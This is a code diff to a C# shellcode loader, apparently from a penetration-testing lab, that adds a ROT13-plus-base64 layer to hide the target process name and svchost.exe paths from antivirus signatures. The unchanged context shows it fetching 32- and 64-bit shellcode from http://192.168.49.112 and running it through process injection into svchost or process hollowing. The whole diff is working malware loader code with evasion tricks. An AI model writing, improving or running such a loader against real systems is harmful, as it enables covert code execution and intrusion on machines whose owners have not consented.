@@ -6,6 +6,20 @@ using System.Runtime.InteropServices;
 
 public static class ShellcodeRunner
 {
+    private static string Decrypt(string enc)
+    {
+        string alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+        string ralph = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm";
+
+        char[] dec = enc.ToCharArray();
+        for (int i = 0; i < dec.Length; i++)
+        {
+            try { dec[i] = ralph[alph.IndexOf(dec[i])]; }
+            catch { }
+        }
+        return new string(dec);
+    }
+
     public static bool DetectAV()
     {
         DateTime now = DateTime.Now;
@@ -141,14 +155,16 @@ public static class ShellcodeRunner
         byte[] shellcode32 = LoadShellcode("http://192.168.49.112/shellcode32.bin");
         byte[] shellcode64 = LoadShellcode("http://192.168.49.112/shellcode64.bin");
 
-        string processName = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("c3ZjaG9zdA=="));
+        // svchost
+        string processName = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(Decrypt("p3MwnT9mqN==")));
         Process process = GetProcess(processName);
 
         if (IntPtr.Size == 8 && process != null)
             ProcessInjection(process, shellcode64);
         else
         {
-            string b64_filename = IntPtr.Size == 4 ? "QzpcV2luZG93c1xTeXNXT1c2NFxzdmNob3N0LmV4ZQ==" : "QzpcV2luZG93c1xTeXN0ZW0zMlxzdmNob3N0LmV4ZQ==";
+            // C:\Windows\SysWOW64\svchost.exe, C:\Windows\System32\svchost.exe
+            string b64_filename = IntPtr.Size == 4 ? Decrypt("DmcpI2yhMT93p1kGrKAKG1p2ASkmqzAbo3A0YzI4MD==") : Decrypt("DmcpI2yhMT93p1kGrKA0MJ0mZykmqzAbo3A0YzI4MD==");
             string filename = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64_filename));
             ProcessHollowing(filename, IntPtr.Size == 4 ? shellcode32 : shellcode64);
         }
